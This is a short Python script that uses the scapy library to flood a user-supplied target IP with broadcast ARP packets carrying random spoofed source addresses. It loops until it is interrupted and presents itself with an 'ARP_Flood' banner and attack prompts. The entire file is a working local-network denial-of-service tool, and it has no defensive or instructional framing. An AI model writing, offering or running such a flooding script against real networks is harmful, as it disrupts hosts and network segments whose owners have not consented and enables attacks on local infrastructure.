import scapy.all as scapy
import time
import os

def Arp_flood():
		
	clear = os.system('clear')
	
	print("**************************************")
	print("                ARP_Flood")
	print("**************************************")
	print("Tip:Can not attack across network segments!!")
	print("--------------------------------------------------")
	print("Please input target's  IP")
	
	target = input("[ARP_Flood]#")
	attack_number = 0
	try:
		while True:
			
			packet = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")/scapy.ARP(psrc=scapy.RandIP(),pdst=target)
			print("Flooding.....")
			scapy.srpflood(packet)
			time.sleep(1)
	except KeyboardInterrupt:
		print("[-]Ctrl + C detected.....")

Arp_flood()